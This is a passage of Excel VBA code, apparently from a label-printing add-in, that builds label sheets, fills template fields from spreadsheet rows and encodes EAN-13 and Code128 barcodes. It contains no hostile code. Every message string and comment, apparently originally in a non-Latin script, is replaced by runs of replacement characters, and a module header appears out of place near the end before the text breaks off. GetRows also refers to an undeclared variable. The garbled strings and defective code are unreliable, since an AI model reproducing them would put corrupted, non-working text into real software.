            MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
        ' NewFilename$ = OUTPUT_FOLDER$(True) & Format(Now, "YYYY-MM-DD HH-NN-SS") & ".xls"
    Else
        WorksheetNumber& = ActiveWorkbook.Worksheets.Count
        sht.Copy , ActiveWorkbook.Worksheets(ActiveWorkbook.Worksheets.Count): DoEvents
        Set sh = ActiveSheet
        If ActiveWorkbook.Worksheets.Count <> WorksheetNumber& + 1 Then
            msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|" & vbNewLine & _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
    End If
    sh.Name = SHEET_NAME & SheetNameSuffix$
    sh.Tab.Color = vbGreen
    sh.UsedRange.Clear        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    sh.Shapes.SelectAll: Selection.Delete
    
    Set CreateLabelsWorksheet = sh
End Function

Function GetRows() As Range
    On Error Resume Next: Err.Clear
    Dim ra As Range, HeaderRowsCount As Long, SelectedRows As Range, CheckColumn As Range
    Set ra = ActiveSheet.UsedRange
    msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    If Err Then MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    
    HeaderRowsCount = Val(SETT.GetBoolean("ComboBox_FirstRow")) - 1
    
    If HeaderRowsCount > 0 Then
        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Set ra = Intersect(ra, ra.Worksheet.Range((HeaderRowsCount + 1) & ":" & ra.Worksheet.Rows.Count))
        msg = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & HeaderRowsCount & " |fffd||fffd||fffd||fffd||fffd|)"
        If ra Is Nothing Then MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    End If
    
    If Not SETT.GetBoolean("CheckBox_UseAllRows") Then
        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
        Set SelectedRows = Intersect(Selection.EntireRow, Selection.EntireRow)
        msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
        If SelectedRows Is Nothing Then MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        
        Set ra = Intersect(ra, SelectedRows)
        msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & HeaderRowsCount & " |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        If ra Is Nothing Then MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    End If
    
    BaseColumn& = SETT.GetNumber("ComboBox_BaseColumn")
    If BaseColumn& Then
        msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & BaseColumn& & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
        Err.Clear: Set CheckColumn = ActiveSheet.Columns(BaseColumn&)
        If Err Then MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        
        Set CheckColumn = Range(Cells(HeaderRowsCount + 1, col), Cells(Rows.Count, col).End(xlUp))
        If CheckColumn.Row < HeaderRowsCount + 1 Then
            msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & _
                vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & CheckColumn.Address & ")"
            MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
        
        Set CheckColumn = Intersect(CheckColumn, ra.EntireRow)
        If CheckColumn Is Nothing Then
            msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & _
                vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & CheckColumn.Address & ")"
            MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
        
        Dim cell As Range: Set ra = Nothing
        For Each cell In CheckColumn.Cells
            If Len(Trim(cell)) > 0 And Not (IsNumeric(cell) And Val(cell) = 0) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If ra Is Nothing Then Set ra = cell Else Set ra = Union(cell, ra)
            End If
        Next cell
        
        If ra Is Nothing Then
            msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & _
                vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & CheckColumn.Address & ")"
            MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
        End If
        
    End If
    
    ra.EntireRow.Select
    Set GetRows = ra.EntireRow
End Function

Function CalculateLabelsCount(ByVal ra As Range) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim CountColumn&, ro As Range, cnt&
    If SETT.GetBoolean("CheckBox_AmountColumn") Then CountColumn& = SETT.GetNumber("ComboBox_CountColumn")
    For Each ro In ra.Rows
        cnt& = 1: If CountColumn& Then cnt& = Abs(Fix(Val(ro.Cells(CountColumn&))))
        If Not ro.EntireRow.Hidden Then CalculateLabelsCount = CalculateLabelsCount + cnt&
    Next
End Function

Function RenderCode(ByVal rf$, ByRef SourceRow As Range, Optional ByVal Index& = 1, Optional ByVal CopyIndex& = 1) As String
    On Error Resume Next
    Dim txt$
    Select Case True
        Case rf Like String(Len(rf), "#")        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            txt = SourceRow.Cells(Val(rf))
        Case rf Like "=[A-z]*#"        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Err.Clear: txt = SourceRow.Worksheet.Range(Mid(rf, 2)).Cells(1)
            If Err.Number = 1004 Then txt = "{incorrect cell or range name: " & rf & "}"
        Case rf Like "=*"        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Err.Clear: txt = SourceRow.Worksheet.Range(Mid(rf, 2)).Value
            If Err.Number = 1004 Then txt = "{named range not found: " & rf & "}"
        Case rf = "now", rf = "date": txt = Now
        Case rf = "index": txt = Index
        Case rf = "copy": txt = CopyIndex&
        Case Else: txt = "{unknown reference: " & rf & "}"
    End Select
    RenderCode = txt$
End Function

Function ReplaceFieldInShape(ByRef sha As Shape, ByVal ReplaceField, _
        ByRef SourceRow As Range, ByVal Index&, Optional ByVal CopyIndex& = 1)
    On Error Resume Next: Err.Clear
    Dim rf$, txt, IsEAN13 As Boolean, IsCode128 As Boolean, prefix$         ' rf - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, txt - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    rf = Replace(Replace(ReplaceField, "}", ""), "{", "")
    IsEAN13 = False: If rf Like "*(ean13)*" Then IsEAN13 = True: rf = Replace(rf, "(ean13)", "")
    IsCode128 = False: If rf Like "*(code128)*" Then IsCode128 = True: rf = Replace(rf, "(code128)", "")
    
    txt = RenderCode(rf$, SourceRow, Index&, CopyIndex&)
    sha.TextFrame.Characters.Text = Replace(sha.TextFrame.Characters.Text, ReplaceField, txt)
End Function

Function ReplaceFieldInRange(ByRef DestRange As Range, ByVal ReplaceField, _
        ByRef SourceRow As Range, ByVal Index&, Optional ByVal CopyIndex& = 1)
    On Error Resume Next: Err.Clear
    Dim rf$, txt, IsEAN13 As Boolean, IsCode128 As Boolean, prefix$         ' rf - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, txt - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    rf = Replace(Replace(ReplaceField, "}", ""), "{", "")
    IsEAN13 = False: If rf Like "*(ean13)*" Then IsEAN13 = True: rf = Replace(rf, "(ean13)", "")
    IsCode128 = False: If rf Like "*(code128)*" Then IsCode128 = True: rf = Replace(rf, "(code128)", "")
    
    txt = RenderCode(rf$, SourceRow, Index&, CopyIndex&)
    
    If IsEAN13 And (InStr(1, txt, ": ") = 0) Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| EAN13
        prefix$ = SETT.GetText("TextBox_EAN13_Prefix")
        txt = Trim(txt)
        If Len(txt) < 13 Then
            prefix$ = prefix$ & String(12 - Len(txt) - Len(prefix$), "0")
            txt = prefix$ & txt
            'txt = add_check_digit(txt)
        End If
        txt = ean13(txt)
    End If
    
    If IsCode128 And (InStr(1, txt, ": ") = 0) Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Code128
        txt = Code128(txt)
    End If
    
    ' If index = 1 Then Debug.Print "replace |fffd|" & ReplaceField & "|fffd| with |fffd|" & txt & "|fffd|"
    DestRange.Replace ReplaceField, txt, xlPart, , False, , False, False
    'If Err Then Debug.Print Err.Number, Err.Description
End Function

Function FindAll(SearchRange As Range, _
        FindWhat As Variant, _
        Optional LookIn As XlFindLookIn = xlValues, _
        Optional LookAt As XlLookAt = xlWhole, _
        Optional SearchOrder As XlSearchOrder = xlByRows, _
        Optional MatchCase As Boolean = False, _
        Optional BeginsWith As String = vbNullString, _
        Optional EndsWith As String = vbNullString, _
        Optional BeginEndCompare As VbCompareMethod = vbTextCompare) As Range
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    ' FindAll
    ' This searches the range specified by SearchRange and returns a Range object
    ' that contains all the cells in which FindWhat was found. The search parameters to
    ' this function have the same meaning and effect as they do with the
    ' Range.Find method. If the value was not found, the function return Nothing. If
    ' BeginsWith is not an empty string, only those cells that begin with BeginWith
    ' are included in the result. If EndsWith is not an empty string, only those cells
    ' that end with EndsWith are included in the result. Note that if a cell contains
    ' a single word that matches either BeginsWith or EndsWith, it is included in the
    ' result.  If BeginsWith or EndsWith is not an empty string, the LookAt parameter
    ' is automatically changed to xlPart. The tests for BeginsWith and EndsWith may be
    ' case-sensitive by setting BeginEndCompare to vbBinaryCompare. For case-insensitive
    ' comparisons, set BeginEndCompare to vbTextCompare. If this parameter is omitted,
    ' it defaults to vbTextCompare. The comparisons for BeginsWith and EndsWith are
    ' in an OR relationship. That is, if both BeginsWith and EndsWith are provided,
    ' a match if found if the text begins with BeginsWith OR the text ends with EndsWith.
    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
    
    Dim FoundCell As Range, FirstFound As Range, LastCell As Range, rngResultRange As Range
    Dim XLookAt As XlLookAt, Include As Boolean, CompMode As VbCompareMethod
    Dim Area As Range, MaxRow As Long, MaxCol As Long, BeginB As Boolean, EndB As Boolean
    
    CompMode = BeginEndCompare
    XLookAt = LookAt: If BeginsWith <> vbNullString Or EndsWith <> vbNullString Then XLookAt = xlPart
    
    ' this loop in Areas is to find the last cell of all the areas. That is, the cell whose row
    ' and column are greater than or equal to any cell in any Area.
    For Each Area In SearchRange.Areas
        With Area
            If .Cells(.Cells.Count).Row > MaxRow Then MaxRow = .Cells(.Cells.Count).Row
            If .Cells(.Cells.Count).Column > MaxCol Then MaxCol = .Cells(.Cells.Count).Column
        End With
    Next Area
    Set LastCell = SearchRange.Worksheet.Cells(MaxRow, MaxCol)
    Set FoundCell = SearchRange.Find(what:=FindWhat, after:=LastCell, _
        LookIn:=LookIn, LookAt:=XLookAt, _
        SearchOrder:=SearchOrder, MatchCase:=MatchCase)
    
    If Not FoundCell Is Nothing Then
        Set FirstFound = FoundCell
        Do Until False        ' Loop forever. We'll "Exit Do" when necessary.
            Include = False
            If BeginsWith = vbNullString And EndsWith = vbNullString Then
                Include = True
            Else
                If BeginsWith <> vbNullString Then
                    If StrComp(Left(FoundCell.Text, Len(BeginsWith)), _
                        BeginsWith, BeginEndCompare) = 0 Then Include = True
                End If
                If EndsWith <> vbNullString Then
                    If StrComp(Right(FoundCell.Text, Len(EndsWith)), _
                        EndsWith, BeginEndCompare) = 0 Then Include = True
                End If
            End If
            If Include = True Then
                If rngResultRange Is Nothing Then
                    Set rngResultRange = FoundCell
                Else
                    Set rngResultRange = Application.Union(rngResultRange, FoundCell)
                End If
            End If
            Set FoundCell = SearchRange.FindNext(after:=FoundCell)
            If (FoundCell Is Nothing) Then Exit Do
            If (FoundCell.Address = FirstFound.Address) Then Exit Do
        Loop
    End If
    Set FindAll = rngResultRange
End Function


Public Function add_check_digit(barcode_string)
    '   the string transfered should be 12 chars long
    If Not Len(barcode_string) = 12 Then
        add_check_digit = barcode_string
        Exit Function
    End If
    
    '   checking that all characters in the barcode are digits
    For i% = 1 To Len(barcode_string)
        If Asc(Mid$(barcode_string, i%, 1)) < 48 Or Asc(Mid$(barcode_string, i%, 1)) > 57 Then
            add_check_digit = barcode_string
            Exit Function
        End If
    Next
    
    '   Calculating the check digit
    If Len(barcode_string) = 12 Then
        For i% = 2 To 12 Step 2
            checksum% = checksum% + Val(Mid$(barcode_string, i%, 1))
        Next
        checksum% = checksum% * 3
        For i% = 1 To 11 Step 2
            checksum% = checksum% + Val(Mid$(barcode_string, i%, 1))
        Next
        barcode_string = barcode_string & (10 - checksum% Mod 10) Mod 10
    End If
    
    '   exiting
    add_check_digit = barcode_string
    
End Function

Public Function ean13(ByVal chaine$)
    Dim i%, checksum%, first%, CodeBarre$, tableA As Boolean
    ean13 = ""
    
    '   checking that all characters in the barcode are digits
    For i% = 1 To Len(chaine)
        If Asc(Mid$(chaine, i%, 1)) < 48 Or Asc(Mid$(chaine, i%, 1)) > 57 Then
            ean13 = ""
            Exit Function
        End If
    Next
    
    '   Calculating the check digit
    If Len(chaine) = 12 Then
        For i% = 2 To 12 Step 2
            checksum% = checksum% + Val(Mid$(chaine, i%, 1))
        Next
        checksum% = checksum% * 3
        For i% = 1 To 11 Step 2
            checksum% = checksum% + Val(Mid$(chaine, i%, 1))
        Next
        chaine = chaine & (10 - checksum% Mod 10) Mod 10
    End If
    
    '   developing the barcode string
    If Len(chaine) = 13 Then
        '   The first number is taken as is, the second is from Table A
        CodeBarre$ = Left$(chaine, 1) & Chr$(65 + Val(Mid$(chaine, 2, 1)))
        first% = Val(Left$(chaine, 1))
        For i% = 3 To 7
            tableA = False
            Select Case i%
                Case 3
                    Select Case first%
                        Case 0 To 3
                            tableA = True
                    End Select
                Case 4
                    Select Case first%
                        Case 0, 4, 7, 8
                            tableA = True
                    End Select
                Case 5
                    Select Case first%
                        Case 0, 1, 4, 5, 9
                            tableA = True
                    End Select
                Case 6
                    Select Case first%
                        Case 0, 2, 5, 6, 7
                            tableA = True
                    End Select
                Case 7
                    Select Case first%
                        Case 0, 3, 6, 8, 9
                            tableA = True
                    End Select
            End Select
            
            If tableA Then
                CodeBarre$ = CodeBarre$ & Chr$(65 + Val(Mid$(chaine, i%, 1)))
            Else
                CodeBarre$ = CodeBarre$ & Chr$(75 + Val(Mid$(chaine, i%, 1)))
            End If
        Next
        
        CodeBarre$ = CodeBarre$ & "*"   'Adding central divider
        For i% = 8 To 13
            CodeBarre$ = CodeBarre$ & Chr$(97 + Val(Mid$(chaine, i%, 1)))
        Next
        CodeBarre$ = CodeBarre$ & "+"   'adding the terminating char
        ean13 = CodeBarre$
    End If
End Function


Public Function Code128(ByVal txt$) As String
    Dim c As New clsCode128
    Code128 = c.Code128_Str(txt$)
    Set c = Nothing
End Function

Function REGEXP()
    On Error Resume Next
    Static REGEXP_ As Object
    If REGEXP_ Is Nothing Then Set REGEXP_ = CreateObject("VBScript.RegExp"): REGEXP_.Global = True
    Set REGEXP = REGEXP_
End Function

Function Render(ByVal txt As String, ByRef ro As Range) As String
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| {2}) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    Dim key, match As Object, addr$, cell_value$, time_format$, dt As Long, code$, col&
    
    txt = Replace(txt, "{ParserName}", RunningParser.Name)
    
    If txt Like "*{*}*" Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {=B2}, {=CellName}
        With REGEXP
            .Pattern = "{=(\D[^{}]*)}"
            If .test(txt) Then
                For Each match In .Execute(txt)
                    addr$ = match.submatches.Item(0)
                    Err.Clear: cell_value$ = ro.Worksheet.Range(addr$).Cells(1).Text
                    If Err = 0 Then txt = Replace(txt, match.Value, cell_value$)
                Next
            End If
            
            .Pattern = "{(\d+)}"
            If .test(txt) Then
                For Each match In .Execute(txt)
                    col& = Val(match.submatches.Item(0))
                    Err.Clear: cell_value$ = ro.Cells(col&).Text
                    If Err = 0 Then txt = Replace(txt, match.Value, cell_value$)
                Next
            End If
            
            
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {time=DD.MM.YYYY hh-nn-ss}
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| time |fffd| = |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd| -, |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, {time-1=DD.MM.YYYY} |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, {time+2=DD.MM.YYYY} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If txt Like "*{time*=*}*" Then
                .Pattern = "{time(|[+-]\d{1,4})=([^{}]*)}"
                If .test(txt) Then
                    For Each match In .Execute(txt)
                        time_format$ = match.submatches.Item(1)
                        dt = Val(match.submatches.Item(0))
                        txt = Replace(txt, match.Value, Format(Now + dt, time_format$))
                    Next
                End If
            End If
        End With
    End If
    
    If txt Like "*{chr#*}*" Then
        With REGEXP
            .Pattern = "{chr(\d+)}"
            If .test(txt) Then
                For Each match In .Execute(txt)
                    code$ = match.submatches.Item(0)
                    txt = Replace(txt, match.Value, ChrW(Val(code$)))
                Next
            End If
        End With
    End If
    
    Render = txt
End Function

Attribute VB_Name = "mod_Labels"
'---------------------------------------------------------------------------------------
' Module        : mod_Labels                       Version: 1
' Author        : Igor Vakhnenko                   Date: 09.06.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module
Public sht As Worksheet, pi As ProgressIndicator

Sub CreateLabels()
    On Error Resume Next
